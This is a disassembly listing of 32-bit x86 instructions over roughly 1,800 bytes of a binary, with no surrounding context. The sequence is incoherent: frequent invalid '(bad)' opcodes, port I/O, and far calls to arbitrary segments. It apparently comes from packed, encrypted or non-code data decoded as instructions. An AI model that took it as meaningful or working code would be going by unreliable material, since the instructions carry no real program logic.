  41dd03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd04:	mov    BYTE PTR [eax+0x6a],ch
  41dd07:	push   esi
  41dd08:	jbe    0x41dca2
  41dd0a:	mov    edx,0x3fc45a1c
  41dd0f:	sub    DWORD PTR [ebx],edi
  41dd11:	jbe    0x41dd76
  41dd13:	jbe    0x41dcdb
  41dd15:	(bad)  
  41dd16:	mov    bh,0xa9
  41dd18:	pushf  
  41dd19:	xchg   esi,eax
  41dd1a:	fs jb  0x41dcf6
  41dd1d:	inc    esi
  41dd1e:	imul   esi,esp,0x33
  41dd21:	rol    DWORD PTR [ebx-0x44],cl
  41dd24:	xor    ch,BYTE PTR [edx-0x28]
  41dd27:	mov    eax,0xc4b7f227
  41dd2c:	mov    bh,0x6d
  41dd2e:	push   cs
  41dd2f:	sbb    DWORD PTR [ebx-0x63cd33f2],edi
  41dd35:	and    ah,BYTE PTR [edi+0x22d76059]
  41dd3b:	sahf   
  41dd3c:	mov    WORD PTR [ebx+ecx*8+0x16],ss
  41dd40:	mov    WORD PTR [edi],?
  41dd42:	ins    DWORD PTR es:[edi],dx
  41dd43:	in     al,dx
  41dd44:	sbb    esp,0x624cccfc
  41dd4a:	mov    WORD PTR [ebp+0x365615b7],ss
  41dd50:	ja     0x41ddcc
  41dd52:	sbb    eax,0x855e4a62
  41dd57:	pusha  
  41dd58:	jb     0x41dcdc
  41dd5a:	dec    eax
  41dd5b:	inc    ebx
  41dd5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd5d:	int    0xaa
  41dd5f:	inc    ebp
  41dd60:	add    eax,0x85f43a
  41dd65:	or     al,0x4
  41dd67:	cwde   
  41dd68:	ud2    
  41dd6a:	aad    0xe
  41dd6c:	mov    esi,0x31011e66
  41dd71:	test   eax,0x8c660e70
  41dd76:	aas    
  41dd77:	in     al,dx
  41dd78:	cmp    cl,BYTE PTR [ebx]
  41dd7a:	cld    
  41dd7b:	std    
  41dd7c:	imul   ecx,DWORD PTR [edi+ebx*8],0x41
  41dd80:	jno    0x41dd2f
  41dd82:	add    dh,BYTE PTR [edi-0x25]
  41dd85:	sbb    eax,0x871bb506
  41dd8a:	lea    edi,[esi]
  41dd8c:	int3   
  41dd8d:	daa    
  41dd8e:	es leave 
  41dd90:	js     0x41dd82
  41dd92:	pop    eax
  41dd93:	dec    esi
  41dd94:	stos   BYTE PTR es:[edi],al
  41dd95:	mov    bh,0xdb
  41dd97:	or     ah,BYTE PTR [edx]
  41dd99:	sbb    BYTE PTR [edx-0x1476a37d],bl
  41dd9f:	jp     0x41dd80
  41dda1:	and    DWORD PTR [edx],edi
  41dda3:	jmp    0x41ddc4
  41dda5:	xor    ebp,esi
  41dda7:	out    dx,eax
  41dda8:	out    0x1,al
  41ddaa:	je     0x41dda1
  41ddac:	imul   ebp,DWORD PTR [esi+edx*2-0x2954f41c],0x64
  41ddb4:	pusha  
  41ddb5:	popf   
  41ddb6:	aam    0x96
  41ddb8:	xchg   ebp,eax
  41ddb9:	es push ebx
  41ddbb:	inc    esp
  41ddbc:	push   eax
  41ddbd:	leave  
  41ddbe:	pop    esi
  41ddbf:	push   eax
  41ddc0:	mov    ch,0x69
  41ddc2:	popa   
  41ddc3:	cmp    edi,edx
  41ddc5:	addr16 dec ebp
  41ddc7:	adc    ebp,DWORD PTR [esi-0x6e2cdca5]
  41ddcd:	xchg   edx,eax
  41ddce:	adc    eax,0x89d5796a
  41ddd3:	stc    
  41ddd4:	dec    edi
  41ddd5:	nop
  41ddd6:	idiv   esi
  41ddd8:	xchg   ebx,eax
  41ddd9:	dec    ebx
  41ddda:	push   cs
  41dddb:	xchg   ecx,eax
  41dddc:	fcmove st,st(5)
  41ddde:	stos   DWORD PTR es:[edi],eax
  41dddf:	xor    edx,ebp
  41dde1:	cmp    al,0xc5
  41dde3:	pop    esi
  41dde4:	push   esp
  41dde5:	sbb    edi,DWORD PTR [esi+eiz*2-0x21]
  41dde9:	mov    dl,0x72
  41ddeb:	repnz inc esp
  41dded:	mov    al,0xfd
  41ddef:	and    BYTE PTR [edx+esi*8],dh
  41ddf2:	(bad)  
  41ddf3:	stc    
  41ddf4:	popf   
  41ddf5:	out    dx,eax
  41ddf6:	and    eax,0x8fb2be9b
  41ddfb:	scas   al,BYTE PTR es:[edi]
  41ddfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddfd:	mov    ecx,0x408c7043
  41de02:	hlt    
  41de03:	inc    esi
  41de04:	pop    ebp
  41de05:	fimul  DWORD PTR [esi+0x51135fea]
  41de0b:	fcomp  QWORD PTR [ecx]
  41de0d:	call   0x5f9d:0x151c0f73
  41de14:	ds popf 
  41de16:	adc    ebx,DWORD PTR [edx+ebp*2+0x13]
  41de1a:	fcomp  DWORD PTR [ecx+0x10]
  41de1d:	mov    gs,ebx
  41de1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de20:	dec    ebp
  41de21:	sbb    ch,dl
  41de23:	push   edx
  41de24:	xor    al,0xdd
  41de26:	out    0x6b,eax
  41de28:	push   ss
  41de29:	rol    DWORD PTR [ebx],1
  41de2b:	popf   
  41de2c:	jg     0x41de47
  41de2e:	ficomp DWORD PTR [edx-0x7cfc6037]
  41de34:	xor    cl,BYTE PTR [edx*2-0x32164e17]
  41de3b:	cli    
  41de3c:	(bad)  
  41de3e:	fst    DWORD PTR [ebp-0x516868ef]
  41de44:	call   0xdfcdee84
  41de49:	adc    dl,BYTE PTR [eax+0x1905d198]
  41de4f:	ins    BYTE PTR es:[edi],dx
  41de50:	ror    BYTE PTR [eax+eax*8-0x62],0x55
  41de55:	out    0x56,al
  41de57:	pop    ebp
  41de58:	inc    edx
  41de59:	(bad)  
  41de5a:	jae    0x41ded9
  41de5c:	lahf   
  41de5d:	xchg   ebp,eax
  41de5e:	stos   DWORD PTR es:[edi],eax
  41de5f:	lds    ebx,FWORD PTR [esi-0x68]
  41de62:	and    BYTE PTR [eax+0x406e1c2d],ah
  41de68:	and    al,0xe3
  41de6a:	xor    BYTE PTR [ecx-0x1dc7e3ef],bl
  41de70:	jmp    0x5eb8:0x446e3f9d
  41de77:	into   
  41de78:	dec    edi
  41de79:	mov    ebx,0x970ef6f2
  41de7e:	mov    edi,0xf46a7701
  41de83:	outs   dx,DWORD PTR ds:[esi]
  41de84:	fcomp  QWORD PTR [edi-0x654cdd48]
  41de8a:	test   BYTE PTR ds:[edx-0x4f],dh
  41de8e:	xor    dh,BYTE PTR [edi+0x30]
  41de91:	cmp    BYTE PTR [ebx+0x18],0xdd
  41de95:	jae    0x41dec4
  41de97:	test   al,0x8c
  41de99:	jnp    0x41ded9
  41de9b:	add    eax,0x96e09fdb
  41dea0:	sub    BYTE PTR ds:0xcbd5a2a5,0xe0
  41dea7:	das    
  41dea8:	mov    cl,0xa3
  41deaa:	sub    al,0x20
  41deac:	aas    
  41dead:	mov    ds:0x218c5fce,eax
  41deb2:	loop   0x41de46
  41deb4:	das    
  41deb5:	lahf   
  41deb6:	pop    ds
  41deb7:	push   edx
  41deb8:	out    dx,al
  41deb9:	das    
  41deba:	mov    ah,0x84
  41debc:	dec    edx
  41debd:	inc    eax
  41debe:	js     0x41dee9
  41dec0:	call   0x7967:0x4a874f5e
  41dec7:	and    al,0xca
  41dec9:	ins    DWORD PTR es:[edi],dx
  41deca:	gs push ds
  41decc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41decd:	pop    ds
  41dece:	cs nop
  41ded0:	cwde   
  41ded1:	mov    cl,0xe6
  41ded3:	out    dx,eax
  41ded4:	push   ecx
  41ded5:	pop    ss
  41ded6:	je     0x1cfed237
  41dedc:	sbb    ecx,esp
  41dede:	xor    dl,bh
  41dee0:	clc    
  41dee1:	cmp    DWORD PTR [ebx],edi
  41dee3:	or     eax,0x3d8549cc
  41dee8:	leave  
  41dee9:	outs   dx,DWORD PTR ds:[esi]
  41deea:	rol    DWORD PTR [ecx+esi*1],cl
  41deed:	push   es
  41deee:	adc    DWORD PTR [ecx-0x22],esi
  41def1:	aas    
  41def2:	jmp    0xd7c2:0x1fc0445a
  41def9:	das    
  41defa:	test   BYTE PTR [edi],al
  41defc:	(bad)
  41deff:	xor    bl,0x5c
  41df02:	daa    
  41df03:	cmp    dh,al
  41df05:	imul   ecx,DWORD PTR [ebp+0x55d3c401],0xffffff93
  41df0c:	pop    ebp
  41df0d:	mov    bh,0x9d
  41df0f:	adc    ah,dl
  41df11:	push   edi
  41df12:	sbb    BYTE PTR [ebx],0xcb
  41df15:	outs   dx,BYTE PTR ds:[esi]
  41df16:	jb     0x41ded4
  41df18:	ds push es
  41df1a:	leave  
  41df1b:	dec    ecx
  41df1c:	pusha  
  41df1d:	cmp    DWORD PTR [edx],eax
  41df1f:	xchg   esp,eax
  41df20:	inc    edx
  41df21:	sub    BYTE PTR [edi],ch
  41df23:	icebp  
  41df24:	aaa    
  41df25:	adc    BYTE PTR [ebx+ecx*1+0x1aa442bd],al
  41df2c:	pop    eax
  41df2d:	sub    bl,dl
  41df2f:	test   DWORD PTR [esi],ebp
  41df31:	data16 hlt 
  41df33:	cmp    dh,BYTE PTR [edx]
  41df35:	xchg   BYTE PTR [edx-0x5945a54c],bl
  41df3b:	les    eax,FWORD PTR [ecx]
  41df3d:	(bad)  
  41df3e:	call   0x2c947bf9
  41df43:	pusha  
  41df44:	outs   dx,BYTE PTR ds:[esi]
  41df45:	cmp    BYTE PTR [eax+ecx*8+0x2f],bh
  41df49:	ds xor al,0x26
  41df4c:	mov    WORD PTR [ebp-0x19],es
  41df4f:	and    DWORD PTR [eax+ebx*8-0x2c7ce099],ebp
  41df56:	ror    BYTE PTR [esi+0x74],1
  41df59:	pop    ebp
  41df5a:	mov    ah,0x3
  41df5c:	das    
  41df5d:	retf   0x9b39
  41df60:	repz and eax,0xa02546b1
  41df66:	pop    edx
  41df67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df68:	mov    edx,0xc466ada3
  41df6d:	lock add esi,DWORD PTR [edi+0x6701df7]
  41df74:	mov    bh,0x1a
  41df76:	push   edx
  41df77:	jo     0x41dfc3
  41df79:	test   ebx,edx
  41df7b:	leave  
  41df7c:	push   cs
  41df7d:	mov    eax,0xf28d8be9
  41df82:	add    edx,DWORD PTR [edx-0x30]
  41df85:	mov    eax,0xee938689
  41df8a:	shr    DWORD PTR [ebx+ecx*8+0x7a],cl
  41df8e:	push   ss
  41df8f:	inc    esp
  41df90:	pop    es
  41df91:	dec    eax
  41df92:	stc    
  41df93:	fidivr WORD PTR [eax]
  41df95:	or     ebp,DWORD PTR [ebx+0x73874fd6]
  41df9b:	in     al,dx
  41df9c:	adc    bl,BYTE PTR [ebp+0x25]
  41df9f:	cs fs xchg esi,eax
  41dfa2:	lods   al,BYTE PTR ds:[esi]
  41dfa3:	xchg   edi,eax
  41dfa4:	cmp    al,0xda
  41dfa6:	adc    DWORD PTR ds:0xe1fc8168,eax
  41dfac:	test   BYTE PTR [edi-0x71537245],ch
  41dfb2:	adc    dh,ch
  41dfb4:	jge    0x41dfe4
  41dfb6:	ja     0x41e035
  41dfb8:	lods   eax,DWORD PTR ds:[esi]
  41dfb9:	sbb    dl,cl
  41dfbb:	sbb    eax,0x8d0eeea8
  41dfc0:	in     al,dx
  41dfc1:	xor    al,0xee
  41dfc3:	dec    edx
  41dfc4:	bound  eax,QWORD PTR [edi-0xa]
  41dfc7:	pop    edx
  41dfc8:	or     BYTE PTR [ecx+eax*1],dl
  41dfcb:	sub    eax,0xc6027bb8
  41dfd0:	sub    BYTE PTR [esi+0x50538c2],ah
  41dfd6:	dec    esp
  41dfd7:	pop    ecx
  41dfd8:	and    BYTE PTR [eax+esi*1],dh
  41dfdb:	(bad)  
  41dfdc:	js     0x41df9c
  41dfde:	jo     0x41dfd4
  41dfe0:	add    al,0xf7
  41dfe2:	cmp    ebp,DWORD PTR [eax+0x1c]
  41dfe5:	rcl    DWORD PTR [esp+ebx*4-0x16260562],cl
  41dfec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfed:	lock outs dx,DWORD PTR ds:[esi]
  41dfef:	dec    ebp
  41dff0:	stc    
  41dff1:	(bad)  
  41dff2:	push   edi
  41dff3:	jb     0x41e029
  41dff5:	les    edx,FWORD PTR [edx+0x46]
  41dff8:	xor    al,0x24
  41dffa:	ret    
  41dffb:	xchg   ebp,eax
  41dffc:	aad    0x5d
  41dffe:	cmp    edi,DWORD PTR [ebx-0x4c02adf1]
  41e004:	in     eax,0xd7
  41e006:	add    ch,dl
  41e008:	sbb    edi,DWORD PTR [ebx]
  41e00a:	out    0xd8,al
  41e00c:	inc    ebp
  41e00d:	retf   
  41e00e:	sub    BYTE PTR [edi],dh
  41e010:	pop    esp
  41e011:	lock mov ecx,0xdc1efcf5
  41e017:	sub    edi,ebp
  41e019:	xchg   ebp,eax
  41e01a:	test   BYTE PTR [ecx-0x5a66bbbc],ah
  41e020:	jp     0x41e074
  41e022:	out    0x1f,al
  41e024:	mov    ah,0xe3
  41e026:	gs pop ds
  41e028:	int3   
  41e029:	push   cs
  41e02a:	stc    
  41e02b:	into   
  41e02c:	in     eax,0xb4
  41e02e:	adc    DWORD PTR ds:0x9f640e60,ebp
  41e034:	xchg   esi,eax
  41e035:	scas   al,BYTE PTR es:[edi]
  41e036:	jno    0x41e068
  41e038:	out    dx,eax
  41e039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e03a:	loop   0x41e090
  41e03c:	dec    ecx
  41e03d:	mov    bh,0x78
  41e03f:	mov    edi,0x2af15168
  41e044:	push   0xe
  41e046:	adc    DWORD PTR [esi+0x4134d9f],ecx
  41e04c:	push   cs
  41e04d:	pop    ebp
  41e04e:	and    al,0xc9
  41e050:	sub    al,0x4c
  41e052:	inc    edi
  41e053:	mov    ebx,0xf0a7fe75
  41e058:	jb     0x41dfe2
  41e05a:	std    
  41e05b:	jg     0x41e079
  41e05d:	cmp    bh,dl
  41e05f:	(bad)  
  41e060:	pop    eax
  41e061:	and    al,0x8c
  41e063:	jne    0x41e07e
  41e065:	xchg   ebx,eax
  41e066:	and    al,0x6a
  41e068:	mov    WORD PTR [esi+0x7e05ae29],ds
  41e06e:	pushf  
  41e06f:	mov    DWORD PTR [eax],ecx
  41e071:	pusha  
  41e072:	fs js  0x41e047
  41e075:	add    al,0xb2
  41e077:	sub    ch,BYTE PTR [esi-0x74b2f541]
  41e07d:	mov    ebx,0x185032a0
  41e082:	adc    ecx,eax
  41e084:	push   DWORD PTR [esi+0x18]
  41e087:	mov    WORD PTR [ecx-0x6d],fs
  41e08a:	sub    eax,0xce48032a
  41e08f:	mov    cl,0xa2
  41e091:	add    DWORD PTR [ebx+0x6211c42e],edx
  41e097:	pop    ss
  41e098:	test   al,0x41
  41e09a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e09b:	outs   dx,DWORD PTR ds:[esi]
  41e09c:	xchg   edx,eax
  41e09d:	xchg   edx,eax
  41e09e:	cmp    bl,BYTE PTR [ebx+0x5c033345]
  41e0a4:	pop    ecx
  41e0a5:	push   es
  41e0a6:	xor    ecx,DWORD PTR [ecx+edi*8+0x33]
  41e0aa:	inc    ebp
  41e0ab:	push   ss
  41e0ac:	xor    ch,BYTE PTR [edi]
  41e0ae:	into   
  41e0af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0b0:	mov    ah,0x40
  41e0b2:	and    eax,0x190c8b9b
  41e0b7:	mov    gs,edi
  41e0b9:	pusha  
  41e0ba:	pusha  
  41e0bb:	int    0xb1
  41e0bd:	jecxz  0x41e0cf
  41e0bf:	mov    BYTE PTR [esi+esi*4],ch
  41e0c2:	cmp    ch,al
  41e0c4:	stc    
  41e0c5:	or     ch,BYTE PTR [esi]
  41e0c7:	cmp    BYTE PTR [ebp-0x73],dh
  41e0ca:	pop    ecx
  41e0cb:	ret    0x6856
  41e0ce:	lock jbe 0x41e0c4
  41e0d1:	push   0xffffffd2
  41e0d3:	fidiv  WORD PTR [ebp+0x56]
  41e0d6:	adc    DWORD PTR [edx-0x7803e832],edi
  41e0dc:	xor    esp,edx
  41e0de:	sbb    ebp,DWORD PTR [ebp+esi*1-0x10]
  41e0e2:	sub    DWORD PTR ss:[eax+0x7d],ebx
  41e0e6:	stc    
  41e0e7:	and    al,dh
  41e0e9:	or     dl,dl
  41e0eb:	popf   
  41e0ec:	fstp   TBYTE PTR [eax]
  41e0ee:	cwde   
  41e0ef:	xchg   esp,eax
  41e0f0:	into   
  41e0f1:	(bad)  
  41e0f2:	aam    0xcb
  41e0f4:	mov    ch,0x4
  41e0f6:	mov    ch,0xbe
  41e0f8:	and    al,BYTE PTR [edx-0x475e8866]
  41e0fe:	fwait
  41e0ff:	dec    ecx
  41e100:	(bad)  
  41e102:	cld    
  41e103:	pop    ebp
  41e104:	ret    
  41e105:	scas   eax,DWORD PTR es:[edi]
  41e106:	add    eax,0x7e9e6924
  41e10b:	fstp   DWORD PTR [edx]
  41e10d:	push   0x5d05f61
  41e112:	test   al,0x70
  41e114:	adc    eax,0x82a67573
  41e119:	repz mov eax,0xd6b5710d
  41e11f:	sub    al,0x6b
  41e121:	mov    esi,0xa17c0e90
  41e126:	jle    0x41e19d
  41e128:	retf   
  41e129:	jne    0x41e169
  41e12b:	cs dec ecx
  41e12d:	bound  edx,QWORD PTR [edx-0x13]
  41e130:	and    dh,bh
  41e132:	add    ah,dl
  41e134:	inc    ecx
  41e135:	scas   al,BYTE PTR es:[edi]
  41e136:	xor    esp,DWORD PTR [esi+0x17]
  41e139:	iret   
  41e13a:	out    dx,al
  41e13b:	dec    ebx
  41e13c:	jle    0x41e14c
  41e13e:	imul   dl
  41e140:	lock add dl,BYTE PTR [ebx]
  41e143:	push   ebp
  41e144:	or     eax,0x1eddb995
  41e149:	push   es
  41e14a:	xchg   esi,eax
  41e14b:	ds pop esi
  41e14d:	popf   
  41e14e:	std    
  41e14f:	adc    BYTE PTR [esi-0xc],bl
  41e152:	cli    
  41e153:	xchg   esp,eax
  41e154:	popa   
  41e155:	dec    ecx
  41e156:	cld    
  41e157:	cmp    eax,0x4909c219
  41e15c:	xchg   ecx,eax
  41e15d:	push   cs
  41e15e:	iret   
  41e15f:	mov    esi,DWORD PTR [ebx+0x74acafbe]
  41e165:	ror    BYTE PTR [eax],1
  41e167:	rol    DWORD PTR [esi],1
  41e169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e16a:	cs push cs
  41e16c:	imul   edx,DWORD PTR [eax-0x57],0xf9493096
  41e173:	jg     0x41e1b7
  41e175:	ss mov ebx,0x48485d9e
  41e17b:	push   ebx
  41e17c:	and    DWORD PTR [ebx-0x3756f188],eax
  41e182:	popf   
  41e183:	cs push esp
  41e185:	imul   dl
  41e187:	xchg   ebp,eax
  41e188:	(bad)  
  41e189:	mov    edx,0x69973516
  41e18e:	aas    
  41e18f:	xor    al,0x3d
  41e191:	xor    ah,BYTE PTR [edi-0x2]
  41e194:	push   ebx
  41e195:	out    0x99,eax
  41e197:	pop    edi
  41e198:	cmp    ecx,ebp
  41e19a:	ds pop esp
  41e19c:	dec    ecx
  41e19d:	fbld   TBYTE PTR [eax]
  41e19f:	add    BYTE PTR [edi-0x5b83307d],dl
  41e1a5:	xor    ecx,esp
  41e1a7:	sub    al,0x27
  41e1a9:	cli    
  41e1aa:	dec    esi
  41e1ab:	cmp    ebx,esi
  41e1ad:	(bad)  
  41e1af:	into   
  41e1b0:	jbe    0x41e168
  41e1b2:	adc    esp,edi
  41e1b4:	lods   eax,DWORD PTR ds:[esi]
  41e1b5:	loope  0x41e19f
  41e1b7:	dec    edi
  41e1b8:	retf   
  41e1b9:	pusha  
  41e1ba:	sbb    DWORD PTR [esi+0x5a],edx
  41e1bd:	(bad)  
  41e1be:	adc    edi,DWORD PTR [esi+0x621ab7a0]
  41e1c4:	ss cmp ch,dl
  41e1c7:	cmp    bl,bh
  41e1c9:	sub    DWORD PTR [edi],edi
  41e1cb:	in     al,dx
  41e1cc:	scas   eax,DWORD PTR es:[edi]
  41e1cd:	mov    ch,0x12
  41e1cf:	lea    ebx,[edi+0x400ceaa5]
  41e1d5:	scas   al,BYTE PTR es:[edi]
  41e1d6:	add    DWORD PTR [eax-0x1],0xff0b8be3
  41e1dd:	inc    ebp
  41e1de:	jecxz  0x41e257
  41e1e0:	cmp    DWORD PTR [edx-0x74],ebx
  41e1e3:	js     0x41e194
  41e1e5:	or     al,0x12
  41e1e7:	(bad)  
  41e1e8:	out    dx,eax
  41e1e9:	jb     0x41e1ec
  41e1eb:	xor    eax,0x572af1b9
  41e1f0:	test   eax,0x56ada40f
  41e1f5:	lock add esp,ecx
  41e1f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1f9:	or     eax,ebp
  41e1fb:	mov    al,ds:0x57d4953d
  41e200:	imul   BYTE PTR [edx+0x46]
  41e203:	call   0x4048:0x6a5be982
  41e20a:	cmp    eax,0x126d2077
  41e20f:	sub    eax,0x6692d680
  41e214:	arpl   WORD PTR [edi],di
  41e216:	add    DWORD PTR [ecx+ebx*4+0x7d],ebx
  41e21a:	gs pusha 
  41e21c:	dec    esi
  41e21d:	in     eax,0x4b
  41e21f:	scas   al,BYTE PTR es:[edi]
  41e220:	popf   
  41e221:	mov    dl,0x4
  41e223:	arpl   bx,bp
  41e225:	pop    edx
  41e226:	inc    esp
  41e227:	sub    BYTE PTR [edi+edi*2+0x68],ch
  41e22b:	pushf  
  41e22c:	mov    ds:0x2d606a0a,al
  41e231:	push   0x2b
  41e233:	lea    eax,[eax+ebx*4+0x4648222b]
  41e23a:	out    0x6e,eax
  41e23c:	fs inc ecx
  41e23e:	gs mov dh,0x4e
  41e241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e242:	into   
  41e243:	dec    ecx
  41e244:	mov    ah,0xb7
  41e246:	int3   
  41e247:	sbb    eax,0xaadca1ab
  41e24c:	inc    esi
  41e24d:	out    dx,al
  41e24e:	dec    edi
  41e24f:	iret   
  41e250:	ficomp WORD PTR [edi]
  41e252:	stos   BYTE PTR es:[edi],al
  41e253:	mov    ds,WORD PTR [edi-0xc6976af]
  41e259:	push   ecx
  41e25a:	or     BYTE PTR [eax],bl
  41e25c:	jno    0x41e276
  41e25e:	ror    DWORD PTR [ecx-0x18bcfd79],cl
  41e264:	mov    edi,0x33548b2f
  41e269:	arpl   WORD PTR [ebx+0x2bbf119e],ax
  41e26f:	dec    edx
  41e270:	xchg   ebx,eax
  41e271:	cmp    al,0x21
  41e273:	mov    cl,0xbf
  41e275:	mov    WORD PTR [ebp-0x76],fs
  41e278:	int    0xc7
  41e27a:	adc    eax,0xab89fb3b
  41e27f:	ja     0x41e2c5
  41e281:	cmp    eax,esi
  41e283:	add    DWORD PTR [ebp-0x4e],esp
  41e286:	fadd   DWORD PTR [esi-0x778a76df]
  41e28c:	xor    al,0xa5
  41e28e:	push   ebx
  41e28f:	aas    
  41e290:	mov    esp,0x84ba06b7
  41e295:	or     esi,ebp
  41e297:	aas    
  41e298:	fwait
  41e299:	outs   dx,DWORD PTR ds:[esi]
  41e29a:	jbe    0x41e2d2
  41e29c:	gs mov al,0x2c
  41e29f:	mov    edx,0x8e729704
  41e2a4:	adc    dl,BYTE PTR [ebx+0x72af0a33]
  41e2aa:	mov    ds:0x42c815d5,al
  41e2af:	xchg   esp,eax
  41e2b0:	inc    edi
  41e2b1:	push   esi
  41e2b2:	out    0x3d,al
  41e2b4:	shl    edi,1
  41e2b6:	xor    bh,BYTE PTR [edi+eiz*1]
  41e2b9:	rol    DWORD PTR [ecx+edx*2],cl
  41e2bc:	dec    edi
  41e2bd:	stc    
  41e2be:	inc    ebx
  41e2bf:	sub    DWORD PTR [edi+0xd],esi
  41e2c2:	inc    edi
  41e2c3:	and    eax,0x8846ef89
  41e2c8:	push   ebx
  41e2c9:	loope  0x41e2fe
  41e2cb:	pop    esp
  41e2cc:	cmp    al,0x81
  41e2ce:	rcl    dl,cl
  41e2d0:	jne    0x41e2e2
  41e2d2:	mov    ch,BYTE PTR [edi+0x1c]
  41e2d5:	sbb    eax,0x387425a6
  41e2da:	jno    0x41e2b6
  41e2dc:	sbb    ecx,DWORD PTR [edi]
  41e2de:	and    ah,ch
  41e2e0:	fimul  WORD PTR ds:0xfbc3bf8e
  41e2e6:	(bad)  
  41e2e7:	push   esp
  41e2e8:	int3   
  41e2e9:	sub    bh,BYTE PTR [eax+0x2b]
  41e2ec:	popf   
  41e2ed:	pop    ecx
  41e2ee:	mov    edx,0xc9391199
  41e2f3:	dec    ebx
  41e2f4:	icebp  
  41e2f5:	mov    cl,0xf1
  41e2f7:	or     esi,DWORD PTR [edx+ebp*2-0x18]
  41e2fb:	ins    DWORD PTR es:[edi],dx
  41e2fc:	nop
  41e2fd:	out    dx,eax
  41e2fe:	push   cs
  41e2ff:	out    0xc3,eax
  41e301:	scas   al,BYTE PTR es:[edi]
  41e302:	push   edi
  41e303:	adc    ebp,DWORD PTR [ebx+0x388b4143]
  41e309:	(bad)  
  41e30a:	shl    BYTE PTR [ebp+0x4e9e57af],cl
  41e310:	pop    eax
  41e311:	in     eax,0x22
  41e313:	and    eax,0xdbbd4e60
  41e318:	loop   0x41e33d
  41e31a:	jns    0x41e338
  41e31c:	mov    dh,0x78
  41e31e:	dec    esp
  41e31f:	es inc ecx
  41e321:	fs (bad) 
  41e323:	ja     0x41e37b
  41e325:	push   eax
  41e326:	push   eax
  41e327:	shr    BYTE PTR [ebx],cl
  41e329:	loope  0x41e344
  41e32b:	in     eax,0xbd
  41e32d:	xchg   esp,eax
  41e32e:	pop    esi
  41e32f:	dec    esi
  41e330:	jo     0x41e2fc
  41e332:	jnp    0x41e388
  41e334:	adc    eax,0x2b6ba9a9
  41e339:	xchg   al,cl
  41e33b:	test   BYTE PTR [ecx+0x4d366baf],dl
  41e341:	cmp    BYTE PTR [esi-0x1609cdf2],bh
  41e347:	fnstcw WORD PTR [eax-0x7a]
  41e34a:	and    esi,DWORD PTR [edx-0x6d09d039]
  41e350:	sbb    eax,0x366644a3
  41e355:	jp     0x41e326
  41e357:	test   BYTE PTR [eax+0x27d90668],0x29
  41e35e:	repz or al,0x1e
  41e361:	addr16 push edi
  41e363:	rcl    dh,0xc2
  41e366:	mov    edi,0x8a580cab
  41e36b:	add    eax,0x3f082aa5
  41e370:	push   edx
  41e371:	repnz mov dl,0x54
  41e374:	add    eax,0xf5d247d2
  41e379:	push   cs
  41e37a:	retf   0xd0be
  41e37d:	pop    edi
  41e37f:	and    DWORD PTR [ebp-0x76],ebx
  41e382:	aas    
  41e383:	mov    bl,BYTE PTR [ebx-0x3b]
  41e386:	hlt    
  41e387:	stos   BYTE PTR es:[edi],al
  41e388:	gs dec ebp
  41e38a:	or     edx,DWORD PTR [esi]
  41e38c:	pusha  
  41e38d:	push   ss
  41e38e:	lock pop ds
  41e390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e391:	in     eax,0x84
  41e393:	mov    ecx,DWORD PTR [ebp-0x22]
  41e396:	repnz int3 
  41e398:	jne    0x41e3b2
  41e39a:	dec    esi
  41e39b:	scas   eax,DWORD PTR es:[edi]
  41e39c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e39d:	and    edi,esp
  41e39f:	and    DWORD PTR [edx+0x6ed3f9d9],ecx
  41e3a5:	sub    al,BYTE PTR [ecx-0x38]
  41e3a8:	lds    ebp,FWORD PTR [edi-0x73]
  41e3ab:	lds    ebp,FWORD PTR [ecx]
  41e3ad:	mov    ebx,0xf78a2c1f
  41e3b2:	xor    edx,DWORD PTR [eax-0x59]
  41e3b5:	stc    
  41e3b6:	mov    ebp,ecx
  41e3b8:	mov    al,0xc8
  41e3ba:	jmp    0xd1225282
  41e3bf:	pop    edi
  41e3c0:	popa   
  41e3c1:	mov    gs,WORD PTR [ebx-0x6380e39a]
  41e3c7:	call   0x68f1e394
  41e3cc:	and    eax,0x130616b7
  41e3d1:	jbe    0x41e370
  41e3d3:	cs std 
  41e3d5:	mov    ds:0x7f25b9f8,al
  41e3da:	ja     0x41e409
  41e3dc:	dec    edi
  41e3dd:	add    BYTE PTR [ebp+0x371fb62],dl
  41e3e3:	mov    DWORD PTR [ebx+esi*2+0x42],edx
  41e3e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3e8:	(bad)  
  41e3e9:	mov    ds:0x4539a1fe,al
  41e3ee:	in     al,dx
  41e3ef:	jg     0x41e454
  41e3f1:	loope  0x41e467
  41e3f3:	popa   
  41e3f4:	cwde   
  41e3f5:	test   esi,esp
  41e3f7:	pop    ecx
  41e3f8:	add    esi,ecx
  41e3fa:	sbb    al,0x9
  41e3fc:	sub    DWORD PTR [ebp-0x1623db89],esi
  41e402:	mov    ecx,eax
  41e404:	and    DWORD PTR [ecx+0x40],ebx
  41e407:	add    dl,BYTE PTR [edx]
  41e409:	cmp    dl,bl
  41e40b:	cmp    BYTE PTR [esi],dh
  41e40d:	scas   al,BYTE PTR es:[edi]
  41e40e:	add    eax,0xc2b4f16c
  41e413:	out    dx,eax
  41e414:	les    ebx,FWORD PTR [edx]
  41e416:	push   ss
  41e417:	adc    dl,BYTE PTR [ecx-0x4fd59843]
  41e41d:	std    
  41e41e:	mov    esp,0x83e85cc1
  41e423:	ret    
  41e424:	dec    ebx
  41e425:	enter  0xf0d8,0x4e
  41e429:	arpl   bx,bp
  41e42b:	retf   
  41e42c:	ret    
  41e42d:	mov    eax,0x951698e0
  41e432:	(bad)  
  41e433:	int    0xfd
  41e435:	xchg   esi,eax
